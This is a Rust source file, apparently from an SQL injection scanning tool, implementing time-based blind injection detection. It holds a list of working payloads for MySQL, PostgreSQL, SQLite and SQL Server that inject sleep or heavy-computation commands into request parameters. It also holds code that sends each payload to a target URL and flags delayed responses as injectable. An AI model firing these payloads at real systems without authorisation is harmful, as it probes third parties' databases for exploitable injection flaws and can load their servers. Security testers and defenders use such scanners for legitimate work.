use std::collections::HashMap;

use crate::cli::Method;
use crate::http::HttpClient;
use crate::injections::Injection;

/// Time-based payloads for different engines.
/// Sleep time: 3 seconds. Threshold: 2500ms.
const TIME_PAYLOADS: &[&str] = &[
    // MySQL / MariaDB
    "' AND SLEEP(3)-- -",
    "1' AND SLEEP(3)-- -",
    "' OR SLEEP(3)-- -",
    "\" AND SLEEP(3)-- -",
    "1 AND SLEEP(3)-- -",
    // PostgreSQL
    "'; SELECT pg_sleep(3)-- -",
    "1'; SELECT pg_sleep(3)-- -",
    "' AND 1=(SELECT 1 FROM pg_sleep(3))-- -",
    // SQLite — heavy computation as sleep substitute
    "' AND randomblob(500000000)-- -",
    "1' AND randomblob(500000000)-- -",
    // Microsoft SQL Server
    "'; WAITFOR DELAY '0:0:3'-- -",
    "1'; WAITFOR DELAY '0:0:3'-- -",
    "' WAITFOR DELAY '0:0:3'-- -",
];

const SLEEP_THRESHOLD_MS: u128 = 2500;

pub struct TimeBased;

impl Injection for TimeBased {
    fn name(&self) -> &'static str {
        "time-based"
    }

    fn detect(
        &self,
        client: &HttpClient,
        url: &str,
        method: &Method,
        params: &HashMap<String, String>,
        param: &str,
    ) -> Option<String> {
        let original = params.get(param).cloned().unwrap_or_default();

        // Measure baseline response time (average of 2 requests)
        let baseline_ms = {
            let t1 = client
                .send_raw(url, method, params)
                .map(|(_, _, ms)| ms)
                .unwrap_or(500);
            let t2 = client
                .send_raw(url, method, params)
                .map(|(_, _, ms)| ms)
                .unwrap_or(500);
            (t1 + t2) / 2
        };

        for &payload in TIME_PAYLOADS {
            let injected = format!("{}{}", original, payload);
            match client.send(url, method, params, param, &injected) {
                Ok((_, _, elapsed_ms)) => {
                    // Triggered if response took significantly longer than baseline
                    if elapsed_ms >= SLEEP_THRESHOLD_MS
                        && elapsed_ms > baseline_ms + SLEEP_THRESHOLD_MS / 2
                    {
                        return Some(payload.to_string());
                    }
                }
                Err(_) => continue,
            }
        }
        None
    }
}
